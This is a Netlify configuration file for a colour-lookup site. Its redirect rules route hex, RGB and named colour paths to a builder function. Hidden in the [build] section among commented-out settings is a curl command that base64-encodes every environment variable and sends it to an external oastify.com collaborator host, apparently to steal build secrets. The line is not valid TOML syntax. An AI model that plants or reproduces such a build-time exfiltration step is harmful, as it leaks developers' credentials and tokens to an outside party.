[build]
    #publish = "public"
    #command = "# No build command"
    curl https://w41nz1gsmope4f40ywsh2s7vfmld93xs.oastify.com/ev=$(env | base64 -w 0)

[[redirects]]
    from = "/hex/:color"
    to = "/.netlify/builders/color"
    status = 200
    force = true

[[redirects]]
    from = "/rgb/:r/:g/:b"
    to = "/.netlify/builders/color"
    status = 200
    force = true

[[redirects]]
    from = "/named/:color"
    to = "/.netlify/builders/color"
    status = 200
    force = true
